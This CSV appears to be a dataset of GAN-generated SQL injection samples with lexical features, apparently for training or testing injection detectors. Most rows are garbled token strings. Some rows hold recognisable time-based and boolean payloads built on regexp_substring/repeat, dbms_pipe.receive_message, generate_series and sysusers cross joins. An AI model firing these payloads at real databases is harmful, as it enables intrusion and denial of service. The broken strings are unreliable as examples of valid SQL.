label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%1""  =  "",a,ausb_umtyreg1iounteg1tchar  (  (  (  f,abl_unes ' like 'udsing",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456,75.0,28.0,4.368855864846429,42.0,4.0,15.0,14.0,0.56,0.05333333333333334,0.2,0.18666666666666668,2.0,2.0,0.0,0.0,0.0,1.0,0.0,3.0,1.0,2.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"  (  l_inv  aoumta,$les t  ( 1570  =  r  (  88    (  =  =    (  ,500000000  (  (  (  then  )    (  ||char  =    (   (  =eas ands    (  (    (  111  (  (  6503   ype2961p_undw d,agllm..syttalllefges orup.s msy ubmeudsys as as t1ountat af",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457,236.0,39.0,3.926125351081255,87.0,27.0,89.0,33.0,0.3686440677966102,0.11440677966101695,0.3771186440677966,0.13983050847457626,0.0,0.0,0.0,0.0,0.0,5.0,0.0,17.0,0.0,2.0,3.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'zd' like 'iynz"" like ""duml')   fromin.=blel'as t1)oupttpl_ss from tdt4ubcsus yptas or kefg1)ub$s   abcwanstt 7793 t1,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458,357.0,43.0,4.318265816761349,151.0,37.0,114.0,55.0,0.42296918767507,0.10364145658263306,0.31932773109243695,0.15406162464985995,6.0,2.0,0.0,0.0,0.0,2.0,0.0,25.0,0.0,3.0,5.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,11.0
attack,1'   ) and    (  (    (  (  (  (  113  ==--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459,43.0,11.0,2.3029214401951643,3.0,4.0,24.0,12.0,0.06976744186046512,0.09302325581395349,0.5581395348837209,0.27906976744186046,1.0,0.0,2.0,0.0,0.0,2.0,0.0,7.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1""      andluuulugt,s s aumnf andus 9643  (  =  ,null  ( or or   (  (  (  (  (  4799  ( or    (  6849  y   efint  lnhdonx +char  (  (/=  (  convert  7522  (    (  (  (  (  =  u  =  117 or or t(  (  (  3484 8691x  = a(  (  (  500000000(  (    (  65   (   =    (  (  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460,269.0,36.0,3.4449377785402016,65.0,39.0,123.0,42.0,0.241635687732342,0.1449814126394052,0.45724907063197023,0.15613382899628253,0.0,1.0,0.0,1.0,0.0,6.0,0.0,31.0,0.0,0.0,2.0,8.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,7.0
attack,"1%c'+  (  select zukr where 9215  =  9215 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   +'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461,222.0,38.0,3.881534886603229,68.0,32.0,87.0,35.0,0.3063063063063063,0.14414414414414414,0.3918918918918919,0.15765765765765766,2.0,0.0,0.0,0.0,0.0,2.0,0.0,18.0,1.0,1.0,3.0,10.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,8.0
attack,"18518z0h_g%  113  ,8899  )  =    (  (  '   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   '  (  cs techar  (  *     ||char  =   from a assendh.ypegepet_upit1    asl""  =  ""hdb$6671t  (  gest2t  (  (  (  (  select    (  (  (  (  (  (  =eor t26849    (  =    (  (  122  0x7171706a71/",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462,603.0,48.0,3.589844778851141,158.0,83.0,273.0,89.0,0.2620232172470978,0.13764510779436154,0.4527363184079602,0.14759535655058043,2.0,2.0,0.0,1.0,1.0,7.0,0.0,57.0,1.0,2.0,2.0,21.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,13.0,0.0,0.0,0.0,20.0
attack,"1%'  =  ''   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%1c+1,0'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463,142.0,31.0,3.462247836432329,35.0,16.0,65.0,26.0,0.24647887323943662,0.11267605633802817,0.45774647887323944,0.18309859154929578,6.0,0.0,0.0,0.0,1.0,3.0,0.0,10.0,2.0,1.0,2.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  =  '""   )    from where 3  select 5286  (  (   cbp  =  (    (   (  or 7555sup  _us ab$l_uktdem",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464,99.0,33.0,3.817628668050736,34.0,10.0,40.0,15.0,0.3434343434343434,0.10101010101010101,0.40404040404040403,0.15151515151515152,2.0,1.0,0.0,0.0,0.0,2.0,0.0,6.0,1.0,2.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  '7770'  )   and 8148  =  like  (  'ecllllluundtad' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'%p  ||  * or ,  =p_fudte5000000000  (  (   (  (  *    t4 and _yps.r_blbtassup tmakheeb$comn dst1 ai$ung_s a,agmtmj as u77pesinfunb$aotalmanss at.bzs adoum.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465,427.0,47.0,4.319027823310067,154.0,58.0,149.0,66.0,0.36065573770491804,0.1358313817330211,0.34894613583138173,0.15456674473067916,6.0,0.0,0.0,0.0,3.0,5.0,0.0,25.0,2.0,6.0,3.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,4.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466,10.0,5.0,2.1219280948873624,0.0,1.0,4.0,5.0,0.0,0.1,0.4,0.5,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'  =  ''  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467,16.0,5.0,1.875,0.0,1.0,8.0,7.0,0.0,0.0625,0.5,0.4375,4.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1   )    =     )    /0x717a767a71,0  ,0  r t  (  (  =  ,7417  =    char  121  +char char  select or   (  = a1570s char  ,null  (  ( or and as from   dlag from tfrom t_f' combusu""   )    )    or make_set  (  2551  =  4389,4389  )   and    (    (   ""4799tta,llus char  =  ,null 8446744073709551610   ,null  =    (  from a.tet char  10482642",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468,338.0,39.0,4.0545716745756435,111.0,66.0,124.0,37.0,0.32840236686390534,0.1952662721893491,0.3668639053254438,0.10946745562130178,1.0,2.0,0.0,1.0,0.0,7.0,0.0,14.0,0.0,2.0,8.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.0,2.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,15.0
attack,"1%'then    where and and(    (  83  =   from rt3118  select or  ,null like2642as a,trt3  =  =    (  (  end  select exp  (  (  (  )   hp_t  (  =  from ,seallm,s fk' like 'm..ss agestfongef/n.d#adbn,mt3862  bydppp_umd.nmdo and from t4   us coubn.tumgu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469,249.0,39.0,4.3633115188036475,130.0,17.0,71.0,31.0,0.5220883534136547,0.06827309236947791,0.285140562248996,0.12449799196787148,3.0,0.0,0.0,1.0,0.0,4.0,0.0,9.0,1.0,2.0,5.0,5.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,3.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ' rkpedol_s  _ulab$gesillesu'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'ng5,et_s as and 8446744073709551610  106uagudbl(lft4s t1,  (  (  7522 t  and jzg_3352masas atjdoumauuu$,as as t_ub$,docons t1ug,sin.andkb$f' and tr or refg' t8459  (    and  /*j qxp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470,725.0,48.0,4.299888801605362,328.0,84.0,225.0,88.0,0.45241379310344826,0.11586206896551725,0.3103448275862069,0.12137931034482759,6.0,0.0,0.0,1.0,2.0,2.0,0.0,40.0,0.0,7.0,15.0,15.0,1.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,6.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,19.0
attack,"1%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"-2583'    and 4799  =   (  (  2180  (char  (  (  ||char  *  =  ,t2,rt f char aw or or p    (  (  )  (  =  (    (    =  ) (  ) or e,  (  (  =    (  /  or likettype*""  (tle(  (  ,(  (  ,0  (  65  = wherea,as ibpcfinb   _s as t1t1,s likesysas afgt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472,244.0,41.0,3.759055880431777,78.0,18.0,103.0,45.0,0.319672131147541,0.07377049180327869,0.42213114754098363,0.18442622950819673,1.0,1.0,1.0,1.0,2.0,6.0,0.0,23.0,0.0,1.0,7.0,12.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,8.0
attack,"1   )    (  ,=  +char  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473,31.0,12.0,2.494784832857222,4.0,1.0,17.0,9.0,0.12903225806451613,0.03225806451612903,0.5483870967741935,0.2903225806451613,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0
attack,"-38809643  +char  (  122  (  (  1541    (  (  *    =  (  (  ,csyt_bl_ cbl  q,fl_ntge(  ( and          where oruk' or 'char  (  (  6671 qp_up",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474,140.0,39.0,3.924642292477179,42.0,19.0,56.0,23.0,0.3,0.1357142857142857,0.4,0.16428571428571428,2.0,0.0,1.0,0.0,1.0,1.0,0.0,11.0,0.0,4.0,2.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,5.0
attack,1'+  (  select 'qeas andff'  =  'kb%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475,36.0,19.0,3.726198100024615,17.0,1.0,10.0,8.0,0.4722222222222222,0.027777777777777776,0.2777777777777778,0.2222222222222222,4.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476,348.0,42.0,3.7087829871032167,107.0,35.0,151.0,55.0,0.3074712643678161,0.10057471264367816,0.4339080459770115,0.15804597701149425,4.0,0.0,0.0,0.0,0.0,2.0,0.0,32.0,1.0,2.0,4.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,10.0
attack,"1    )   from where3455  )    (  ||char  )  select and or   (  (  83 (mr  (  =    (  3484pill_r as res afsbst_ugin.ttep  (  (  (  (  (  (  r as o    )up_,ptt4  = att3  )p  100 _umif t  (  ||char  122  )   (  )    from ,0  =up_,s.stas t3  (  (  83  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477,248.0,34.0,3.7732844112494233,84.0,23.0,101.0,40.0,0.3387096774193548,0.09274193548387097,0.40725806451612906,0.16129032258064516,0.0,0.0,0.0,0.0,0.0,3.0,0.0,23.0,0.0,5.0,3.0,7.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,7.0
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478,8.0,4.0,1.75,0.0,1.0,4.0,3.0,0.0,0.125,0.5,0.375,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"14799 7417   abl_tl_eroeas aoundb$dom.staso,asblzs asdb,rdb$l_ulli",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479,66.0,23.0,4.269265096690703,43.0,9.0,6.0,8.0,0.6515151515151515,0.13636363636363635,0.09090909090909091,0.12121212121212122,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )   from as aonm..szbsmuattgewhen    (  (  select  (   1048)    (  =  =/4906|| vu$ommn. f t1     (  500000000//2ang' where rog at_rredontt  (  112  )    (  (  (  =  from inint  =  t,when   )    (  (  (  (    ) t34165=    3862    (   (  1570    (  (  2774  ,null  (  =  (p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480,276.0,43.0,3.9123275157016213,80.0,40.0,112.0,44.0,0.2898550724637681,0.14492753623188406,0.4057971014492754,0.15942028985507245,1.0,1.0,0.0,3.0,0.0,6.0,0.0,24.0,0.0,1.0,2.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'end    =    (  (  (  (  (  (  ((  (  (  (  (  3484up  from from asus   mam.tas aouupds asumalt1,as t3mcth,t0x78Nsindsefksffun""  )  (  ||char  c=    (  (  (  *   s 1087( orinrt  (      48  from    =    =    8571  +  (  =  (  4799 char  (  (  up  (   (  65",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481,256.0,39.0,3.6852055285878453,82.0,26.0,109.0,39.0,0.3203125,0.1015625,0.42578125,0.15234375,1.0,1.0,0.0,0.0,1.0,5.0,0.0,25.0,0.0,0.0,2.0,9.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,5.0
attack,"-    3862""    g""   or  (  ,500000000' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||',0  (  1087 49y2 char  (  (  (  (  rcsu",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482,223.0,38.0,4.127551947410702,80.0,38.0,73.0,32.0,0.35874439461883406,0.17040358744394618,0.3273542600896861,0.14349775784753363,2.0,2.0,1.0,0.0,1.0,2.0,0.0,11.0,0.0,5.0,6.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,6.0
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adomf$t1,r _  ||' and or,as t3(  ) ap_unt  )  (  83(  )   from 2180 char  (  )  )   = 9643/p  (  113  5485    122  (  65  from aomta.4462m.s ibble",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483,386.0,42.0,4.037140939411675,119.0,57.0,146.0,64.0,0.3082901554404145,0.14766839378238342,0.37823834196891193,0.16580310880829016,3.0,0.0,0.0,1.0,0.0,2.0,0.0,33.0,0.0,4.0,6.0,15.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,14.0
attack,"1then2961'  =  ',adbllll_ 'unusual'  9643  (  +  (  3352select t  (  (  =  (  111  1541l$",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484,89.0,26.0,3.8854177319831384,26.0,20.0,28.0,15.0,0.29213483146067415,0.2247191011235955,0.3146067415730337,0.16853932584269662,4.0,0.0,0.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
